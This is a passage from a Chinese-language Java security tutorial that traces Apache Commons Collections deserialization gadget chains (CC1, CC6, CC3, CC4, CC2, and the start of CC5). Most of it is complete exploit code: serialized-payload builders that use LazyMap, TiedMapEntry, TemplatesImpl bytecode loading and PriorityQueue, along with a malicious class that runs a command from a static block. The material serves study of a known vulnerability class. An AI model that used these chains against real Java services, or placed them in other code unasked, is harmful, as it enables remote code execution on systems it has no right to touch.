  ![Snipaste_2025-03-28_11-53-01](JAVA安全/Snipaste_2025-03-28_11-53-01.png)

  - 可以看到`entrySet()`的类可控，且能绕过`invoke()`前两个if，第一个if很好绕过，但第二个if要求是无参方法就真的有点太巧妙了

- 于是就有了以下的代码

  ```java
  Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
  Constructor declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
  declaredConstructor.setAccessible(true);
  
  InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, lazymap);
  Map proxymap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);
  
  #传入Override是因为前面有一个异常判断需要有注解，这里的proxymap便是动态代理，通过proxy.entrySet()的调用便会触发invoke()，进入其中便能得到想要的get()
  Object o =  declaredConstructor.newInstance(Override.class, proxymap);
  ```

- Gadget

  ```java
  AnnotationInvocationHandler.readObject()
  	Map(Proxy).entrySet()
  		AnnotationInvocationHandler.invoke()
              LazyMap.get()	
                  ChainedTransformer.transform()
                      ConstantTransformer(Runtime.class)
                      InvokerTransformer.transform()
                          Class.getMethod
                          gerMethod.getRuntime()
                          Runtime.getRuntime().exec()
  ```

### CC6

这是一条较为通用的链，不像CC1的两条利用链都严格依赖于Common Collections 3.2.1 以及 JDK8u65，当版本不符时便不能再利用了，所以这里再次跟踪CC6利用链

- 这条链可以说是URLDNS前半部分+CC1原生链后半部分的组合，不同的是使用了`TiedMapEntry`作为把链连接起来的节点

- 在URLDNS链的`hashcode()`是关键节点，通过`HashMap`的`readObject()`中`putVal()`衔接

  ![Snipaste_2025-03-28_14-19-30](JAVA安全/Snipaste_2025-03-28_14-19-30.png)

  - 继续跟进`hash()`

    ![Snipaste_2025-03-28_14-19-42](JAVA安全/Snipaste_2025-03-28_14-19-42.png)

- 接来下是`TiedMapEntry.hashcode()`

  ![Snipaste_2025-03-28_14-20-03](JAVA安全/Snipaste_2025-03-28_14-20-03.png)

  - 跟进其中的getValue方法

    ![Snipaste_2025-03-28_14-20-11](JAVA安全/Snipaste_2025-03-28_14-20-11.png)

  - 想要的`get()`也就有了

- 所以反序列化前部分的代码也就有了

  ```java
  HashMap<Object, Object> map = new HashMap<>();
  Map lazymap = LazyMap.decorate(map, chainedTransformer);
  TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "key");
  
  HashMap<Object, Object> hashMap = new HashMap<>();
  hashMap.put(tiedMapEntry, "value");
  ```

- 但是在URLDNS链中就知道了`HashMap.put()`中也触发了`hashcode()`，所以在序列化时便触发了链，修改方法也很简单，在调用`put()`前先不写入完整的链，在序列化前再将链补全

  - 以下是修改方式

    ```java
    HashMap<Object, Object> map = new HashMap<>();
    Map lazymap = LazyMap.decorate(map, new ConstantTransformer(1));
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "key");
    
    HashMap<Object, Object> hashMap = new HashMap<>();
    hashMap.put(tiedMapEntry, "value");
    
    Class<LazyMap> lazyMapClass = LazyMap.class;
    Field field = lazyMapClass.getDeclaredField("factory");
    field.setAccessible(true);
    field.set(lazymap, chainedTransformer);
    ```

  - 序列化时不会执行命令了，但反序列化时也没法正常执行，这里通过调试可以发现在`LazyMap.get()`中如果要执行`transform()`必须满足key值为空，序列化时满足这个条件进入if代码块，但`map.put()`为key赋了值，所以在反序列化时便不会进入代码块了

    ![Snipaste_2025-03-28_14-43-24](JAVA安全/Snipaste_2025-03-28_14-43-24.png)

  - 解决办法也很简单，在反序列化前把赋的值删去即可，所以最终代码是

    ```java
    HashMap<Object, Object> map = new HashMap<>();
    Map lazymap = LazyMap.decorate(map, new ConstantTransformer(1));
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "key");
    
    HashMap<Object, Object> hashMap = new HashMap<>();
    hashMap.put(tiedMapEntry, "value");
    
    Class<LazyMap> lazyMapClass = LazyMap.class;
    Field field = lazyMapClass.getDeclaredField("factory");
    field.setAccessible(true);
    field.set(lazymap, chainedTransformer);
    lazymap.remove("key");
    
    serialize(hashMap);
    ```

  - 还有一种同样可以直接执行的方式，这个修改方式使得在调用`hashMap.put()`前根本没进入`LazyMap`下的if判断语句所以反序化后可以正常执行

    ```java
    HashMap<Object, Object> map = new HashMap<>();
    Map lazymap = LazyMap.decorate(map, chainedTransformer);
    TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "key");
    
    HashMap<Object, Object> hashMap = new HashMap<>();
    hashMap.put(tiedMapEntry, "value");
    
    Class<?> clazz = TiedMapEntry.class;
    Field field = clazz.getDeclaredField("map");
    field.setAccessible(true);
    field.set(tiedMapEntry, lazymap);
    ```

- Gadget

  ```java
  HashMap.readObject()
      HashMap.hash()
      	TiedMapEntry.hashCode()
      		TiedMapEntry.getValue()
      			LazyMap.get()
      				ChainedTransformer.transform()
      					ConstantTransformer.transform()
      					InvokerTransformer.transform()
      					Runtime.getRuntime().exec()
  ```


### CC3

不同与前面的两条链都是直接调用`Runtime.getRuntime()`来执行命令，CC3修改的链的后部分，也就是利用部分，CC3是通过类加载机制来执行的命令

#### 类加载机制

- 类加载的时候会执行代码

  - 初始化的时候执行静态代码块
  - 实例化的时候执行构造代码块、无参构造函数

- 所以要加载类里面有执行命令的代码，也就是加载恶意代码块，如下代码就是在静态代码块中写入执行命令的代码

  ```java
  public class Calc {
      static {
          try {
              Runtime.getRuntime().exec("calc");
          } catch (IOException e) {
              throw new RuntimeException(e);
          }
      }
  ```

- 类的加载最终是通过`defineClass()`完成的，整个调用过程是`loadClass()->findClass()->defineClass()`

- 但`defineClass()`只是加载类，而不是执行类，所以最后的执行方法是`newInstance()`

#### 链的基本逻辑

- 还是由后往前推，因为`defineClass()`的作用域是`protected`所以要找到作用域是`public`的类

  ![Snipaste_2025-03-30_17-01-32](JAVA安全/Snipaste_2025-03-30_17-01-32.png)

- 同样是Find Usages，最后找到`TemplatesImpl类`，这里`defineClass()`没有声明作用域，也就是default，可以在自己的类中被调用

  ![Snipaste_2025-03-30_17-09-07](JAVA安全/Snipaste_2025-03-30_17-09-07.png)

- 继续Find Usages，发现`defineClass()`在`defineTransletClasses()`中被调用

  ![Snipaste_2025-03-30_17-10-50](JAVA安全/Snipaste_2025-03-30_17-10-50.png)

- 但该方法被声明为私有，继续找，然后选择`getTransletInstance()`，因为它调用了`defineTransletClasses()`，而且使用了`newInstance()`进行实例化，也就是有了利用方法，虽然作用域是私有的，但若能调用此方法便完成了一条利用链

  ![Snipaste_2025-03-30_17-13-45](JAVA安全/Snipaste_2025-03-30_17-13-45.png)

- 继续寻找，成功找到公有方法，开始构造链

  ![Snipaste_2025-03-30_17-16-18](JAVA安全/Snipaste_2025-03-30_17-16-18.png)

- 链条利用部分的逻辑很简单，获取`TemplatesImpl类`，然后调用其下的`newTransformer()`即可，也就是如下代码

  ```java
  TemplatesImpl templates = new TemplatesImpl();
  templates.newTransformer();
  ```

- 但为了达成这个逻辑中间有一些条件判断的逻辑需要满足，所以要修改一些参数值，这个类只将参数声明为私有的，并没有做赋值处理，且构造方法也为空，所以要通过反射修改参数值，还是从后往前一步一步完成，首先是`getTransletInstance()`

  ![Snipaste_2025-03-30_17-13-45](JAVA安全/Snipaste_2025-03-30_17-13-45.png)

  - 首先第一个if处要对`_name`赋值，否则直接返回null，然后是不用处理`_class`，此处该参数值默认为null，所以此处代码为

    ```java
    Field name = templatesClass.getDeclaredField("_name");
    name.setAccessible(true);
    name.set(templates, "name");
    ```

    

- 然后进入`defineTransletClasses()`，此方法要修改的地方挺多的

  - 首先是第一处，`_bytecodes`，不能为空

    ![Snipaste_2025-03-30_17-26-58](JAVA安全/Snipaste_2025-03-30_17-26-58.png)

  - 来看一下该参数的声明，是一个二维数组，但它在后面又是作为一维数组传入作为`defineClass()`的值，且里面要存放恶意字节码

    ![Snipaste_2025-03-30_17-28-23](JAVA安全/Snipaste_2025-03-30_17-28-23.png)

    ![Snipaste_2025-03-30_17-31-25](JAVA安全/Snipaste_2025-03-30_17-31-25.png)

  - 所以整个逻辑是将恶意字节码传入一维数组，再将整个参数声明为二维数组，也就是如下代码

    ```java
    Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
    bytecodes.setAccessible(true);
    byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
    byte[][] codes = {code};
    bytecodes.set(templates, codes);
    ```

  - 然后是要修改的第二处地方，`_tfactory`也不能为空，因为此参数调用了方法，并作为返回结果一部分，影响代码的往下运行

    ![Snipaste_2025-03-30_17-35-53](JAVA安全/Snipaste_2025-03-30_17-35-53.png)

  - 同样看参数的声明，是`transient`类型，也就是不可序列化，但既然此参数有作用，就必然会在某处传入值，最后在·`readObject()`处找到，也就是在反序列化时会自动赋值

    ![Snipaste_2025-03-30_17-41-17](JAVA安全/Snipaste_2025-03-30_17-41-17.png)

  - 所以赋相同的值即可，代码如下

    ```java
    Field tfactory = templatesClass.getDeclaredField("_tfactory");
    tfactory.setAccessible(true);
    tfactory.set(templates, new TransformerFactoryImpl());
    ```

  - 按理讲整个代码的逻辑已经可以执行，但实际上还是报错，显示在422行也就是如下位置

    ![Snipaste_2025-03-30_17-45-51](JAVA安全/Snipaste_2025-03-30_17-45-51.png)

  - 此处报了空指针错误，所以最简单的处理方法就是赋值，或是满足if条件不进入else代码块，但往下的if条件若`_transletIndex < 0`就抛出异常，所以需要进入第一个if中，因为此时`_transletIndex `值为-1，而进入if中参数值等于i也就是0，若要满足条件则写入的恶意字节码的父类要为*ABSTRACT_TRANSLET*，跟进查看

    ![Snipaste_2025-03-30_17-52-54](JAVA安全/Snipaste_2025-03-30_17-52-54.png)

  - 所以修改字节码代码为，要继承抽象类则要满足其中的全部方法

    ```java
    package Loader;
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    
    import java.io.IOException;
    
    public class Calc extends AbstractTranslet{
        static {
            try {
                Runtime.getRuntime().exec("calc");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
        }
    
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    
        }
    }
    
    ```

  - 最后整个代码就能成功执行了

- 以上完成了链子的后部分也就是执行部分，前半的入口部分可以用CC1及CC6的共计3钟实现方式

  - 首先是通用链CC6部分

    ```java
            TemplatesImpl templates = new TemplatesImpl();
            Class templatesClass = templates.getClass();
    
            Field name = templatesClass.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(templates, "name");
    
            Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
            bytecodes.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
            byte[][] codes = {code};
            bytecodes.set(templates, codes);
    			//这里不用为_tfactory赋值，因为反序列化时会自动赋值
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(templates),
                //newTransformer为无参方法，所以参数类型和参数都为空即可
                    new InvokerTransformer("newTransformer", null, null)
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    
            HashMap<Object, Object> map = new HashMap<>();
            Map lazymap = LazyMap.decorate(map, chainedTransformer);
    
            TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "key");
    
            HashMap<Object, Object> hashMap = new HashMap<>();
            hashMap.put(tiedMapEntry, "value");
    
            Class<TiedMapEntry> tiedMapEntryClass = TiedMapEntry.class;
            Field field = tiedMapEntryClass.getDeclaredField("map");
            field.setAccessible(true);
            field.set(tiedMapEntry, lazymap);
    
            serialize(hashMap);
            deserialize("ser3.bin");
    ```

  - CC1的原生版本

    ```java
            TemplatesImpl templates = new TemplatesImpl();
            Class templatesClass = templates.getClass();
    
            Field name = templatesClass.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(templates, "name");
    
            Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
            bytecodes.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
            byte[][] codes = {code};
            bytecodes.set(templates, codes);
    			//这里不用为_tfactory赋值，因为反序列化时会自动赋值
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(templates),
                //newTransformer为无参方法，所以参数类型和参数都为空即可
                    new InvokerTransformer("newTransformer", null, null)
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    
            HashMap<Object, Object> map = new HashMap<>();
            map.put("value", "123");
            Map<Object, Object> transformedmap = TransformedMap.decorate(map, null, chainedTransformer);
    
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            declaredConstructor.setAccessible(true);
            Object o = declaredConstructor.newInstance(Target.class, transformedmap);
    
            serialize(o);
            deserialize("ser3.bin");
    ```

  - CC1的动态代理版本

    ```java
            TemplatesImpl templates = new TemplatesImpl();
            Class templatesClass = templates.getClass();
    
            Field name = templatesClass.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(templates, "name");
    
            Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
            bytecodes.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
            byte[][] codes = {code};
            bytecodes.set(templates, codes);
    			//这里不用为_tfactory赋值，因为反序列化时会自动赋值
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(templates),
                //newTransformer为无参方法，所以参数类型和参数都为空即可
                    new InvokerTransformer("newTransformer", null, null)
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    
            HashMap<Object, Object> map = new HashMap<>();
            Map lazymap = LazyMap.decorate(map, chainedTransformer);
    
                    Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            declaredConstructor.setAccessible(true);
            InvocationHandler invocationhandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, lazymap);
            Map proxymap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationhandler);
            Object o = declaredConstructor.newInstance(Override.class, proxymap);
    
            serialize(o);
            deserialize("ser3.bin");
    ```

#### yso利用逻辑

以上的部分已经可以实现此链条了，但在yso中的CC3利用链的实现逻辑还要更深入一些、

- 首先链条的最后也就是要执行`newTransformer()`，所以还可以继续追踪此方法，最后作者选定的是`TrAXFilter类`

  ![Snipaste_2025-03-30_18-21-56](JAVA安全/Snipaste_2025-03-30_18-21-56.png)

- 此类虽然不能序列化，但其templates可以传参控制，所以可以如Runtime一样将其`TrAXFilter.class`序列化

- 然后作者也没有选择调用`InvokerTransformer`，而是选择一个新类`InstantiateTransformer`

  ![Snipaste_2025-03-30_18-31-43](JAVA安全/Snipaste_2025-03-30_18-31-43.png)

- 可以看到此类不仅可以获取指定参数的构造器还能调用构造方法，所以只需修改为如下代码便能调用执行

  ```java
          TemplatesImpl templates = new TemplatesImpl();
          Class templatesClass = templates.getClass();
  
          Field name = templatesClass.getDeclaredField("_name");
          name.setAccessible(true);
          name.set(templates, "name");
  
          Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
          bytecodes.setAccessible(true);
          byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
          byte[][] codes = {code};
          bytecodes.set(templates, codes);
  
          Field tfactory = templatesClass.getDeclaredField("_tfactory");
          tfactory.setAccessible(true);
          tfactory.set(templates, new TransformerFactoryImpl());        
  		InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
          instantiateTransformer.transform(TrAXFilter.class);
  ```

- 最后同样是拼接CC1或CC6的前部分即可，但也同样报了与CC1的参数不可空问题，所以还是要传入Transformer数组，修改如下

  ```java
  Transformer[] transformers = new Transformer[] {
      //保证反序列化时参数传入的是TrAXFilter.class
  new ConstantTransformer(TrAXFilter.class),
  new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
  };
  ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  ```

- 最后只给出最通用的版本

  ```java
  package CC3;
  
  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
  import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
  import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
  import org.apache.commons.collections.Transformer;
  import org.apache.commons.collections.functors.ChainedTransformer;
  import org.apache.commons.collections.functors.ConstantTransformer;
  import org.apache.commons.collections.functors.InstantiateTransformer;
  import org.apache.commons.collections.keyvalue.TiedMapEntry;
  import org.apache.commons.collections.map.LazyMap;
  import org.apache.commons.collections.map.TransformedMap;
  
  import javax.xml.transform.Templates;
  import java.io.*;
  import java.lang.reflect.Field;
  import java.nio.file.Files;
  import java.nio.file.Paths;
  import java.util.HashMap;
  import java.util.Map;
  
  public class CC3Test {
      public static void main(String[] args) throws Exception {
          TemplatesImpl templates = new TemplatesImpl();
          Class templatesClass = templates.getClass();
  
  ​        Field name = templatesClass.getDeclaredField("_name");
  ​        name.setAccessible(true);
  ​        name.set(templates, "name");
  
  ​        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
  ​        bytecodes.setAccessible(true);
  ​        byte[] code = Files.*readAllBytes*(Paths.*get*("D:\\Loader\\Calc.class"));
  ​        byte[][] codes = {code};
  ​        bytecodes.set(templates, codes);
  
  ​        Transformer[] transformers = new Transformer[] {
  ​                new ConstantTransformer(TrAXFilter.class),
  ​                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
  ​        };
  ​        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  
  ​        HashMap<Object, Object> map = new HashMap<>();
  ​        Map lazymap = LazyMap.*decorate*(map, chainedTransformer);
  ​        map.put("value", "123");
  ​        Map<Object, Object> transformedmap = TransformedMap.*decorate*(map, null, chainedTransformer);
  
  ​        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "key");
  
  ​        HashMap<Object, Object> hashMap = new HashMap<>();
  ​        hashMap.put(tiedMapEntry, "value");
  
  ​        Class<TiedMapEntry> tiedMapEntryClass = TiedMapEntry.class;
  ​        Field field = tiedMapEntryClass.getDeclaredField("map");
  ​        field.setAccessible(true);
  ​        field.set(tiedMapEntry, lazymap);
  
          *serialize*(hashMap);
          *deserialize*("ser3.bin");
      }
  
  ​    public static void serialize(Object obj) throws IOException {
  ​        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser3.bin"));
  ​        oos.writeObject(obj);
  ​    }
  
  ​    public static Object deserialize(String Filename) throws IOException, ClassNotFoundException {
  ​        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
  ​        Object o = ois.readObject();
  ​        return o;
  ​    }
  }
  ```


- Gadget

  ```java
  HashMap.readObject()
      HashMap.hash()
      	TiedMapEntry.hashCode()
      		TiedMapEntry.getValue()
      			LazyMap.get()
      				ChainedTransformer.transform()
      					ConstantTransformer.transform()
      					InstantiateTransformer.transform()
      						TemplatesImpl.newTransformer()
      							defineClass->newInstance()
  ```


### CC4

该链沿用CC3的类加载命令执行方式，也就是执行部分不变，入口部分改变。

- 之所以入口部分改变是因为该链使用Common Collections 4.0版本，而该版本的`TransformingComparator类`可以序列化，而在3.2.1版本中不行

  ![Snipaste_2025-03-31_12-41-06](JAVA安全/Snipaste_2025-03-31_12-41-06.png)

- 通过该类的`compare()`可以调用`transform()`

  ![Snipaste_2025-03-31_12-42-50](JAVA安全/Snipaste_2025-03-31_12-42-50.png)

- 接下来就是要找某类调用了`compare()`，最好是在反序列化入口方法中调用，最后找到的是`PriorityQueue类`

  ![Snipaste_2025-03-31_12-46-12](JAVA安全/Snipaste_2025-03-31_12-46-12.png)

  - 跟进`heapify()`

    ![Snipaste_2025-03-31_12-47-02](JAVA安全/Snipaste_2025-03-31_12-47-02.png)

  - 继续跟进

    ![Snipaste_2025-03-31_12-48-34](JAVA安全/Snipaste_2025-03-31_12-48-34.png)

  - 最后找到方法的调用

    ![Snipaste_2025-03-31_12-51-10](JAVA安全/Snipaste_2025-03-31_12-51-10.png)

- 前部分的逻辑基本理顺可以写成初步EXP，后部分直接照搬CC3的执行链

  ```java
          TemplatesImpl templates = new TemplatesImpl();
          Class templatesClass = templates.getClass();
  
          Field name = templatesClass.getDeclaredField("_name");
          name.setAccessible(true);
          name.set(templates, "name");
  
          Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
          bytecodes.setAccessible(true);
          byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
          byte[][] codes = {code};
          bytecodes.set(templates, codes);
          Transformer[] transformers = new Transformer[] {
                  new ConstantTransformer(TrAXFilter.class),
                  new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
          };
          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  //		通过TransformingComparator.compare()调用ChainedTransformer.transform()
          TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
  //		通过PriorityQueue.readObject()作为反序列入口部分
          PriorityQueue<Object> priorityQueue = new PriorityQueue<>(transformingComparator);
  ```

- 好不出意外的报错了，还是调试，通过修改参数改变代码逻辑将链条引导向想要的方向，在`readObject()`下断点，发现在链条最初的`heapify()`就出问题了，这里用了一个`>>>`移位运算符

  ![Snipaste_2025-03-31_10-38-45](JAVA安全/Snipaste_2025-03-31_10-38-45.png)

  - 这里传入的size为0，计算结果i为 0-1 = -1无法进入for循环

    ![Snipaste_2025-03-31_13-03-12](JAVA安全/Snipaste_2025-03-31_13-03-12.png)

  - 当size为2时，计算结果i = 0，能进入循环

    ![Snipaste_2025-03-31_13-03-26](JAVA安全/Snipaste_2025-03-31_13-03-26.png)

  - 看变量声明，size是`PriorityQueue`的队列长度，所以向队列添加2个内容即可

    ![Snipaste_2025-03-31_13-04-15](JAVA安全/Snipaste_2025-03-31_13-04-15.png)

    ```java
            priorityQueue.add(1);
            priorityQueue.add(2);
    ```

- 运行还是报错，跟进`add()`

  ![Snipaste_2025-03-31_11-03-43](JAVA安全/Snipaste_2025-03-31_11-03-43.png)

  ![Snipaste_2025-03-31_11-04-01](JAVA安全/Snipaste_2025-03-31_11-04-01.png)

  ![Snipaste_2025-03-31_11-04-23](JAVA安全/Snipaste_2025-03-31_11-04-23.png)

  ![Snipaste_2025-03-31_11-04-44](JAVA安全/Snipaste_2025-03-31_11-04-44.png)

- 会发现在执行`add()`，会执行一次整体链，之所以报错是因为此处没有修改`_tfactory`变量值，但是此值在反序列化时会自动赋值，所以和之前的`HashMap.put()`的处理方式一致，先不写成完整的链，在序列化之前再将链补全即可，所以最终代码如下

  ```java
          TemplatesImpl templates = new TemplatesImpl();
          Class templatesClass = templates.getClass();
  
          Field name = templatesClass.getDeclaredField("_name");
          name.setAccessible(true);
          name.set(templates, "name");
  
          Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
          bytecodes.setAccessible(true);
          byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
          byte[][] codes = {code};
          bytecodes.set(templates, codes);
          Transformer[] transformers = new Transformer[] {
                  new ConstantTransformer(TrAXFilter.class),
                  new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
          };
          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  //		通过TransformingComparator.compare()调用ChainedTransformer.transform()
          TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
  //		通过PriorityQueue.readObject()作为反序列入口部分
          PriorityQueue<Object> priorityQueue = new PriorityQueue<>(transformingComparator);
          priorityQueue.add(1);
          priorityQueue.add(2);
  
  		Class<? extends TransformingComparator> transformingComparatorClass = transformingComparator.getClass();
  
          Field transformingComparatorClassDeclaredField = transformingComparatorClass.getDeclaredField("transformer");
          transformingComparatorClassDeclaredField.setAccessible(true);
          transformingComparatorClassDeclaredField.set(transformingComparator, chainedTransformer);
  
          serialize(priorityQueue);
          deserialize("ser4.bin");
  ```

- 当然也可以直接通过反射修改size的值，而不用`add()`添加队列值，便可以直接执行，代码如下

  ```java
  package CC4;
  
  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
  import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
  import org.apache.commons.collections4.Transformer;
  import org.apache.commons.collections4.comparators.TransformingComparator;
  import org.apache.commons.collections4.functors.ChainedTransformer;
  import org.apache.commons.collections4.functors.ConstantTransformer;
  import org.apache.commons.collections4.functors.InstantiateTransformer;
  
  import javax.xml.transform.Templates;
  import java.io.*;
  import java.lang.reflect.Field;
  import java.nio.file.Files;
  import java.nio.file.Paths;
  import java.util.PriorityQueue;
  
  public class CC4Test {
      public static void main(String[] args) throws Exception {
  
          TemplatesImpl templates = new TemplatesImpl();
          Class templatesClass = templates.getClass();
  
          Field name = templatesClass.getDeclaredField("_name");
          name.setAccessible(true);
          name.set(templates, "name");
  
          Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
          bytecodes.setAccessible(true);
          byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
          byte[][] codes = {code};
          bytecodes.set(templates, codes);
  
          Transformer[] transformers = new Transformer[] {
                  new ConstantTransformer(TrAXFilter.class),
                  new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
          };
          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  
          TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
  
          PriorityQueue<Object> priorityQueue = new PriorityQueue<>(transformingComparator);
  
          Class<? extends PriorityQueue> priorityQueueClass = PriorityQueue.class;
          Field sizeField = priorityQueueClass.getDeclaredField("size");
          sizeField.setAccessible(true);
          sizeField.set(priorityQueue, 2);
  
          serialize(priorityQueue);
          deserialize("ser4.bin");
  
      }
  
      private static void serialize(Object obj) throws IOException {
          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser4.bin"));
          oos.writeObject(obj);
      }
  
      private static Object deserialize(String Filename) throws IOException, ClassNotFoundException {
          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
          Object o = ois.readObject();
          return o;
      }
  }
  
  ```

- Gadget

  ```java
  PriorityQueue.readObject()
      TransformingComparator.compare()
      	ChainedTransformer.transform()
      		ConstantTransformer.transform()
      			InstantiateTransformer.transform()
      			TemplatesImpl.newTransformer()
  ```

### CC2

CC2利用链是在CC4的基础上抛弃了`Transformer[]`数组的使用，因为shiro漏洞重写了动态加载数组的方法，导致EXP无法通过数组实现，另外用`InvokerTransformer`连接前后部分而不再用`InstantiateTransformer`类初始化了。

- 大部分内容都一样，这里首先要修改一下`InvokerTransformer`，直接调用`newTransformer`，然后该方法无参，传入null即可

  ```java
  InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
  ```

- 然后是要将templates传入链条进行初始化，这里直接传入队列中代入后面执行

  ```java
  priorityQueue.add(templates);
  priorityQueue.add(2);
  ```

  - 这里之所以要第一个传入队列是因为后面调用`transform()`时首先执行第一个参数值

    ![Snipaste_2025-03-31_13-31-53](JAVA安全/Snipaste_2025-03-31_13-31-53.png)

    ![Snipaste_2025-03-31_13-33-14](JAVA安全/Snipaste_2025-03-31_13-33-14.png)

- 所以最终代码就出来了

  ```java
  package CC2;
  
  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
  import org.apache.commons.collections4.functors.ConstantTransformer;
  import org.apache.commons.collections4.functors.InvokerTransformer;
  import org.apache.commons.collections4.comparators.TransformingComparator;
  
  import java.io.*;
  import java.lang.reflect.Field;
  import java.nio.file.Files;
  import java.nio.file.Paths;
  import java.util.PriorityQueue;
  
  public class CC2Test {
      public static void main(String[] args) throws Exception{
          TemplatesImpl templates = new TemplatesImpl();
          Class templatesClass = templates.getClass();
  
          Field name = templatesClass.getDeclaredField("_name");
          name.setAccessible(true);
          name.set(templates, "name");
  
          Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
          bytecodes.setAccessible(true);
          byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
          byte[][] codes = {code};
          bytecodes.set(templates, codes);
  
  
          InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
          TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
  
          PriorityQueue<Object> priorityQueue = new PriorityQueue<>(transformingComparator);
  
          priorityQueue.add(templates);
          priorityQueue.add(2);
  
          Class<? extends TransformingComparator> transformingComparatorClass = transformingComparator.getClass();
          Field transformerField = transformingComparatorClass.getDeclaredField("transformer");
          transformerField.setAccessible(true);
          transformerField.set(transformingComparator, invokerTransformer);
  
          serialize(priorityQueue);
          deserialize("ser2.bin");
  
  
      }
  
      public static void serialize(Object obj) throws IOException {
          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser2.bin"));
          oos.writeObject(obj);
      }
  
      public static Object deserialize(String Filename) throws IOException, ClassNotFoundException {
          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
          Object o = ois.readObject();
          return o;
      }
  }
  
  ```

- Gadget

  ```java
  PriorityQueue.readObject()
      heapify()->siftDown()->siftDownUsingComparator()
      TransformingComparator.compare()
      	InvokerTransformer.transform()
      		TemplatesImpl.newTransformer()
      			TemplatesImpl.newInstance()
  ```


### CC5

CC5与第一个CC1链很像，只不过更换了`Lazy.get()`的调用方法

- 但是调用`get()`的方法太多了，还是根据作者的链来写EXP，作者选择的是`TiedMapEntry.toString()`

